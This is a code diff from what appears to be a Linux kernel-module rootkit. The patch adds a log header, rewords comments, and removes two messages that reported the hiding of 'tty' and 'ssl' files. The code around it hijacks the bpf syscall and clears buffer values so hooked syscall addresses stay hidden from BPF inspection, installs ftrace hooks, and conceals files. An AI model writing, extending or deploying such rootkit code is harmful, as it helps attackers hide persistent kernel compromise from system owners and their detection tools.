@@ -19,6 +19,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
+#include "log.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
@@ -445,16 +446,13 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
 
             /**
              * Now we check if value (stored syscall address)
-             * is among the ones we are hijacking
+             * is one of us
              */
             s = _get_sys_addr(*(unsigned long*)value & 0xfffffffffffffff0);
             if (s != 0UL) {
                 void *v = kmalloc(value_size, GFP_KERNEL);
                 if (v) {
-                    /**
-                     * Convert value to user ptr
-                     * and clear it
-                     */
+                    /** fetch userspace buffer and clear */
                     void __user *uvalue = u64_to_user_ptr(attr->value);
                     memset(v, 0, value_size);
 
@@ -1255,8 +1253,6 @@ bool sys_init(void) {
 
         /** init fist a couple of hidden files */
         if (tty && ssl && fs_add_name_ro(files_to_hide, 0) == 0) {
-            prinfo("Hiding tty file: '%s'\n", tty);
-            prinfo("Hiding ssl file: '%s'\n", ssl);
 
             rc = !fh_install_hooks(ft_hooks);
             if (rc) {
